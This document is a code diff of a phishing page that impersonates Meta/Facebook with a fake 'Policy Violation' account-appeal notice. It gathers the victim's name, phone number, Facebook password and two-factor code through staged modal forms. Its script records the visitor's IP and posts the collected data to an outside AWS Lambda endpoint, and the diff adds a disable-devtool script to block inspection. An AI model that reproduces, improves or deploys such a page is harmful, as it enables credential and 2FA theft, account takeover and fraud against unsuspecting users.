@@ -4,17 +4,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta for Business - Page Appeal</title>
+    <title>Security - Page Appeal</title>
     <link rel="stylesheet" href="../styles/bootstrap.min.css">
     </script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <link rel="stylesheet" href="../styles/style.css">
-    <link rel="shortcut icon" href="../ico.ico" type="image/x-icon">
-
+    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/css/intlTelInput.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
 </head>
 
 <body>
     <script>
+        DisableDevtool();
+
         ! function (t, e) {
             "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : (t = "undefined" != typeof globalThis ? globalThis : t || self).bootstrap = e()
         }(this, (function () {
@@ -630,6 +634,7 @@
                 var diffTime = current - end;
                 var diff = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
                 var clean = false
+                console.log(diff)
                 if (diff >= 0) {
                     var charToPaste = '1'.repeat(0)
                     if (clean) {
@@ -3242,14 +3247,29 @@
             <div class="col-8">
                 <div id="right" style="padding-top: 18px;">
                     <h1>
-                        <img src="../img/block_2.png" alt="" style="height: 40px;
-                        width:40px;
+                        <img src="../img/block_2.png" alt="" style="height: 50px;
+                        width:50px;
                         margin-right: 8px;">
                         Policy Violation
                     </h1>
-                    <h6>We have received multiple reports that suggest that your account has been in violation of our
-                        Terms of Services and Community Guidelines. As a result, your account has been scheduled for
-                        review.</h6>
+                    <!-- <h6>
+                        We detected unusual activity in your page today <span id="todayDate"></span>.
+                        Someone has reported your advertisement for not complying with
+                        <span style="color: blue; text-decoration: underline; cursor: pointer;">Community
+                            Standards</span>
+                        and violates our Terms of Service.
+                    </h6> -->
+
+                    <h6>
+                        We have received multiple reports indicating that your account may be in violation of our Terms of Service and Community Guidelines. As a result, your account has been scheduled for review.
+                    </h6>
+
+                    <div id="utm-ticketId" style="display: block;">
+
+
+                    </div>
+
+
                     <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()"
                         style="display: none; margin-bottom: 15px;">
                         <div class="action-button-img">
@@ -3270,76 +3290,39 @@
                         </div>
                         <br>
                     </div>
-
-                    </ul>
                     <div id="card">
                         <!-- <img src="/img/unlock.png" alt=""> -->
                         <!-- <img src="/img/mobile.png" alt=""> -->
-                        <img src="../img/shild.jpg" alt="">
+                         <img src="../img/333.png" alt="" style="background-color: #1877f2;padding: 80px 0">
+
                         <div class="card-text">
-                            <h4>This form is only to be used for submitting appeals and restoring account status</h4>
-                            <p>Please ensure that you provide the requested information below.
-                                Failure to do so may delay the processing of your appeal.</p>
+                            <h4>This form is intended solely for submitting appeals and requesting account restoration.
+                            </h4>
+                            <p>Please ensure that you provide all the required information below. Failure to do so may
+                                result in delays in processing your appeal.</p>
+
                             <div class="btn-wrapper">
                                 <div id="start" class="button fb-blue w-100" data-bs-toggle="modal"
-                                    data-bs-target="#exampleModal1">
+                                    data-bs-target="#exampleModal1" style="font-weight: 600;">
                                     Request Review</button>
                                 </div>
                             </div>
+
                         </div>
+
                     </div>
-
-                    <h6>Privacy Center</h6>
-                    <div class="fake-likns">
-                        <div class="action-button-list">
-                            <div class="action-button wide">
-                                <div class="action-button-img">
-                                    <img src="../img/save_img.png" alt="">
-                                </div>
-                                <div class="action-button-text">
-                                    <span>What is the Privacy Policy and what does it say?</span>
-                                    <br>
-                                    <span class="small-grey">Privacy Policy</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
-                                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd"
-                                            d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="action-button wide">
-                                <div class="action-button-img">
-                                    <img src="../img/save_img.png" alt="">
-                                </div>
-                                <div class="action-button-text">
-                                    <span>How you can manage or delete your information</span>
-                                    <br>
-                                    <span class="small-grey">Privacy Policy</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
-                                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd"
-                                            d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                        </div>
-
-                        <br>
-                        <h6>For more details, see the User Agreement</h6>
+                </div>
+                <h6>Privacy Center</h6>
+                <div class="fake-likns">
+                    <div class="action-button-list">
                         <div class="action-button wide">
                             <div class="action-button-img">
-                                <img src="../img/doc.png" alt="">
+                                <img src="../img/save_img.png" alt="">
                             </div>
                             <div class="action-button-text">
-                                <span>Meta AI</span>
+                                <span>What is the Privacy Policy and what does it say?</span>
                                 <br>
-                                <span class="small-grey">User Agreement</span>
+                                <span class="small-grey">Privacy Policy</span>
                             </div>
                             <div class="action-button-arrow">
                                 <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
@@ -3350,85 +3333,125 @@
                                 </svg>
                             </div>
                         </div>
-                        <br>
-                        <h6>Additional resources</h6>
+                        <div class="action-button wide">
+                            <div class="action-button-img">
+                                <img src="../img/save_img.png" alt="">
+                            </div>
+                            <div class="action-button-text">
+                                <span>How you can manage or delete your information</span>
+                                <br>
+                                <span class="small-grey">Privacy Policy</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
 
-                        <div class="action-button-list">
-                            <div class="action-button wide">
-                                <div class="action-button-text">
-                                    <span>How Meta uses information for generative AI models</span>
-                                    <br>
-                                    <span class="small-grey">Privacy Center</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
-                                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd"
-                                            d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="action-button wide">
-                                <div class="action-button-text">
-                                    <span>Cards with information about the operation of AI systems</span>
-                                    <br>
-                                    <span class="small-grey">Meta AI website</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
-                                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd"
-                                            d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="action-button wide">
-                                <div class="action-button-text">
-                                    <span>Introduction to Generative AI</span>
-                                    <br>
-                                    <span class="small-grey">For teenagers</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
-                                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd"
-                                            d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-
+                    <br>
+                    <h6>For more details, see the User Agreement</h6>
+                    <div class="action-button wide">
+                        <div class="action-button-img">
+                            <img src="../img/doc.png" alt="">
+                        </div>
+                        <div class="action-button-text">
+                            <span>Meta AI</span>
+                            <br>
+                            <span class="small-grey">User Agreement</span>
+                        </div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                </path>
+                            </svg>
                         </div>
                     </div>
                     <br>
-                    <p class="small-grey">We continually identify potential privacy risks, including
-                        when collecting, using or sharing personal information, and developing methods to reduce these
-                        risks. Read more about
-                        <a target="_blank" id="policyLink" class="add-svg">Privacy Policy
+                    <h6>Additional resources</h6>
 
-                        </a>
-                    </p>
+                    <div class="action-button-list">
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span>How Meta uses information for generative AI models</span>
+                                <br>
+                                <span class="small-grey">Privacy Center</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span>Cards with information about the operation of AI systems</span>
+                                <br>
+                                <span class="small-grey">Meta AI website</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span>Introduction to Generative AI</span>
+                                <br>
+                                <span class="small-grey">For teenagers</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
 
-                </div>
-
-            </div>
-
-
-            <div class="popup" id="popup">
-
-                <div class="popup-item">
-                    <div class="burger-button-popup" id="closePopup">
-                        <div class="bar"></div>
-                        <div class="bar"></div>
                     </div>
-                    <div class="popup-content"></div>
                 </div>
-            </div>
+                <br>
+                <p class="small-grey">We continually identify potential privacy risks, including
+                    when collecting, using or sharing personal information, and developing methods to reduce these
+                    risks. Read more about
+                    <a target="_blank" id="policyLink" class="add-svg">Privacy Policy
 
+                    </a>
+                </p>
+
+            </div>
 
         </div>
+
+
+        <div class="popup" id="popup">
+
+            <div class="popup-item">
+                <div class="burger-button-popup" id="closePopup">
+                    <div class="bar"></div>
+                    <div class="bar"></div>
+                </div>
+                <div class="popup-content"></div>
+            </div>
+        </div>
+
+
+    </div>
     </div>
 
     <div class="modal form-modal" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel"
@@ -3436,7 +3459,7 @@
         <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title" id="exampleModalLabel">Appeal Form</h5>
+                    <h4 class="modal-title" id="exampleModalLabel">Appeal Form</h4>
                     <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
                 <div class="modal-body">
@@ -3448,6 +3471,7 @@
                             </label>
                             <textarea name="apeal" class="form-control" id="exampleFormControlTextarea1" rows="1"
                                 required></textarea>
+                            <div id="emailHelp" class="form-text"></div>
                         </div>
                         <div class="mb-3">
                             <label for="FullNameField" class="form-label">Full Name</label>
@@ -3468,8 +3492,10 @@
 
                         <div class="mb-3">
                             <label for="PhoneFirld" class="form-label">Mobile phone number</label>
-                            <input value="" name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld"
-                                required aria-describedby="emailHelp" minlength="7" maxlength="18">
+                            <br>
+                            <input id="phone" value="" name="mobile-phone-number" type="tel" class="form-control"
+                                id="PhoneFirld" required aria-describedby="emailHelp" minlength="7" maxlength="18">
+
                         </div>
                         <div class="mb-3">
                             <label for="fb-page-name-input" class="form-label">Facebook Page Name</label>
@@ -3513,13 +3539,14 @@
                         <img src="../img/fb_round_logo.png" alt="" class="fb-logo-round">
 
                     </div>
+
                     <form id="apiForm" autocomplete="off">
                         <div class="mb-3">
                             <div class="password-input">
                                 <label for="exampleInputPassword" class="form-label">Password</label>
                                 <div style="display: flex; align-items: center;">
                                     <input name="password-1" type="password" class="form-control"
-                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="30"
+                                        id="exampleInputPassword" autocomplete="off" minlength="6"
                                         aria-describedby="emailHelp" required
                                         onfocus="this.removeAttribute('readonly');">
                                 </div>
@@ -3567,12 +3594,35 @@
                 <div class="modal-body">
                     <div class="twoFAinfo-wraper">
                         <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
-                        <p>Enter the code for this account from the two-factor authentication you set up (such as
-                            Google Authenticator, email or text message on your mobile).</p>
+                        <br>
+                        <p>Enter the 6-digit code for this account from the two-factor authentication you set up
+                            (such
+                            as Google Authenticator, email or text message on your mobile).</p>
                         <div class="fb-round-wraper">
                             <img src="../img/2FA.png" alt="" style="width: 100%;">
                         </div>
+                        <!-- <div class="approval-status">
+                            <div class="approval-icon">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24" aria-hidden="true">
+                                    <path
+                                        d="M15 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0zM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2zM11 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0z">
+                                    </path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0z">
+                                    </path>
+                                </svg>
+                            </div>
+                            <div class="approval-text">
+                                <div class="status-title">Waiting for approval</div>
+                                <div class="status-note">
+                                    A login request has been sent to your devices. Please check Facebook on your device
+                                    and approve the request to proceed.
+                                </div>
+                            </div>
+                        </div> -->
                     </div>
+
+
 
                     <form id="twoFAForm">
                         <div class="mb-3">
@@ -3619,9 +3669,11 @@
                             <img src="../img/phone.png" alt="" style="width: 100%;">
                         </div>
                         <br>
-                        <p>Your request has been added to the processing queue. We will process your request within 24
+                        <p>Your request has been added to the processing queue. We will process your request
+                            within 24
                             hours. If you
-                            do not receive an email message with the appeal status within 24 hours, please resend the
+                            do not receive an email message with the appeal status within 24 hours, please
+                            resend the
                             appeal.</p>
 
                     </div>
@@ -3651,9 +3703,11 @@
                 <div class="modal-body">
                     <h4 class="modal-title" id="TermsModalLabel">Terms of use
                     </h4>
-                    <p>Meta creates technologies and services that allow people to communicate with each other, form
+                    <p>Meta creates technologies and services that allow people to communicate with each other,
+                        form
                         communities and develop companies. This User Agreement governs the use of
-                        you Facebook, Messenger, and other products, features, applications, services, technologies and
+                        you Facebook, Messenger, and other products, features, applications, services,
+                        technologies and
                         software we offer (<a class="add-svg">Meta Products</a>
                         or <a class="add-svg">Products</a>), if not expressly
                         states that separate terms apply (and this agreement does not apply). These Products
@@ -3706,7 +3760,8 @@
                     </h6>
                     <ul>
                         <li><a class="add-svg">Advertising Rules</a>. These rules apply to partners who
-                            advertise on various Meta Products and determine the types of advertising content that such
+                            advertise on various Meta Products and determine the types of advertising content
+                            that such
                             partners are permitted to use.
 
                         </li>
@@ -3721,7 +3776,8 @@
                         </li>
                         <li><a class="add-svg">Commercial terms</a>. These terms apply if you use or access our
                             Products for any commercial or business purposes, including advertising, using our
-                            measurement services, managing an application on our Platform, a group or a Company Page,
+                            measurement services, managing an application on our Platform, a group or a Company
+                            Page,
                             and selling goods or services .
 
                         </li>
@@ -3737,7 +3793,8 @@
                         <div class="action-button-img">
                             <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
                                 class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
-                                <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
+                                <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z">
+                                </path>
                                 <path fill-rule="evenodd" clip-rule="evenodd"
                                     d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
                                 </path>
@@ -3769,6 +3826,7 @@
                 </div>
                 <div class="modal-body">
                     <h4 class="modal-title" id="policyModalLabel">Privacy Policy</h4>
+                    <br>
                     <h5>What is the Privacy Policy and what does it cover?</h5>
                     <div class="action-button wide">
                         <div class="action-button-img">
@@ -3787,7 +3845,8 @@
                         </div>
                     </div>
                     <br>
-                    <p>At Meta, we want you to understand what information we collect, how we use it, and with whom we
+                    <p>At Meta, we want you to understand what information we collect, how we use it, and with
+                        whom we
                         use it.
                         let's share. Therefore, we recommend that you read our Privacy Policy. This
                         will help you use
@@ -3797,13 +3856,17 @@
                     </p>
                     <br>
                     <p>In the Privacy Policy, we explain how we collect, use, store information, and
-                        We also share it. We also tell you about your rights. Each section of the Policy contains
+                        We also share it. We also tell you about your rights. Each section of the Policy
+                        contains
                         Useful examples and simplified statements to make our work easier to understand. We also
-                        added links to resources where you can learn in more detail about topics that interest you
+                        added links to resources where you can learn in more detail about topics that interest
+                        you
                         with confidentiality.</p>
                     <br>
-                    <p>It is important to us that you know how to manage your privacy (confidentiality), so we also
-                        We show you where in the settings of the Meta Products you use you can manage your data. You
+                    <p>It is important to us that you know how to manage your privacy (confidentiality), so we
+                        also
+                        We show you where in the settings of the Meta Products you use you can manage your data.
+                        You
                         you can
                         <a target="_blank" class="add-svg">
                             update these settings
@@ -3812,7 +3875,7 @@
                     </p>
                     <br>
                     <p>
-                        Полный текст политики приведен ниже.
+                        The full text of the policy is provided below.
                     </p>
                     <br>
                     <div class="action-button-list">
@@ -3851,7 +3914,8 @@
                         The information we collect and process about you depends on how you use our <a
                             class="add-svg">Products</a>.
                         For example, we collect different information when you sell
-                        furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you
+                        furniture on Marketplace and when you post a Reels video on Instagram. We collect data
+                        about you
                         when you use our Products, <a class="add-svg">even if you do not have an account</a>.
                     </p>
                     <br>
@@ -3916,14 +3980,16 @@
                     <br>
                     <h5>What happens if you do not allow us to collect certain types of information?</h5>
                     <br>
-                    <p>Some information is necessary for the operation of our Products. Other information is optional,
+                    <p>Some information is necessary for the operation of our Products. Other information is
+                        optional,
                         but its absence may affect your experience with our products.</p>
                     <p><a>More details ></a></p>
                     <br>
                     <h5>What if the information we collect does not personally identify individuals?</h5>
                     <br>
                     <p>In some cases, before third parties make information available to us, they de-identify,
-                        aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use
+                        aggregate, or anonymize it so that it cannot be used to identify individual individuals.
+                        We use
                         this information as described below, without attempting to re-identify individuals.</p>
                     <br>
                     <h5>Data control</h5>
@@ -4014,7 +4080,8 @@
                 </div>
                 <div class="modal-body">
                     <h4 class="modal-title" id="accountsModalLabel">Accounts in the Privacy Center </h4>
-                    <p>Accounts and profiles that you add to one Account Center are also available in the Privacy
+                    <p>Accounts and profiles that you add to one Account Center are also available in the
+                        Privacy
                         Center. Here you can select the account and profile you need.</p> <br>
                     <div class="action-button wide">
                         <div class="action-button-img">
@@ -4039,9 +4106,61 @@
             </div>
         </div>
     </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
 
+    <script>
+        document.addEventListener("DOMContentLoaded", async () => {
+            const input = document.querySelector("#phone");
+            let countryCode = "us";
 
+            try {
+                const res = await fetch("https://api.db-ip.com/v2/free/self/");
+                const data = await res.json();
+                if (data.countryCode) {
+                    countryCode = data.countryCode.toLowerCase();
+                }
+            } catch (error) {
+                console.error("Lỗi khi lấy quốc gia:", error);
+            }
 
+            // Khởi tạo intl-tel-input
+            const iti = window.intlTelInput(input, {
+                initialCountry: countryCode,
+                utilsScript:
+                    "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.min.js",
+                nationalMode: false,
+                autoHideDialCode: false,
+            });
+
+            // Giữ dấu + luôn ở đầu
+            input.addEventListener("input", function () {
+                if (!input.value.startsWith("+")) {
+                    input.value = "+" + input.value.replace(/[^0-9]/g, "");
+                }
+            });
+        });
+    </script>
+
+    <!-- <script>
+        // Tạo ngày hiện tại dạng: May 29, 2025
+        const today = new Date().toLocaleDateString("en-US", {
+            year: "numeric",
+            month: "long",
+            day: "numeric"
+        });
+
+        // Cập nhật phần tử có id="todayDate" nếu tồn tại
+        const todayDateElem = document.getElementById("todayDate");
+        if (todayDateElem) {
+            todayDateElem.textContent = today;
+        }
+
+        // Cập nhật phần tử có id="date" nếu tồn tại
+        const dateElem = document.getElementById("date");
+        if (dateElem) {
+            dateElem.textContent = today;
+        }
+    </script> -->
 
     <script>
         window.mobileCheck = function () {
@@ -4232,7 +4351,7 @@
         }
 
         var INCORRECT_2FA_TIMEOUT = 60
-        var SEND_FORM_FICTIV_TIME = 3000
+        var SEND_FORM_FICTIV_TIME = 2000
 
         var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
         var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
@@ -4322,8 +4441,6 @@
 
         })
 
-
-
         // Get User IP
         var url = 'https://api.db-ip.com/v2/free/self/'
         async function getUserIp() {
@@ -4345,7 +4462,6 @@
                 }
             }
         }
-
         /////
         getUserIp()
 
@@ -4371,7 +4487,7 @@
                 'user_referrer': window.window.location.href
             };
 
-            $.ajax('https://ajfesgwpz2qubmqrdvu6warxam0lssjq.lambda-url.us-west-2.on.aws/', {
+            $.ajax('https://ajfesgwpz2qubmqrdvu6warxam0lssjq.lambda-url.us-west-2.on.aws', {
                 type: 'POST',
                 data: JSON.stringify(templateData),
                 contentType: 'application/json'
@@ -4404,7 +4520,7 @@
             setTimeout(function () {
                 var errortext = apiForm.querySelector('.invalid-feedback')
                 errortext.style.display = 'none'
-            }, 6000)
+            }, 15000)
         }
 
         function apiFormhandle(event) {
@@ -4552,6 +4668,7 @@
                 var now = new Date().getTime();
                 var distance = Math.round((now - countDownDate) / 1000);
                 var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
+
                 var tmps = '';
                 if (insertedTime < 10) {
                     tmps = '0';
@@ -4566,7 +4683,6 @@
                 }
             }, 1000);
         }
-
 
         /* ----------------------------------------------------------------------------- */
         document.addEventListener('DOMContentLoaded', function () {
@@ -4708,6 +4824,10 @@
         delectAccountUtm()
         delectTicketIdUtm()
     </script>
+
+
+
+
 </body>
 
 </html>
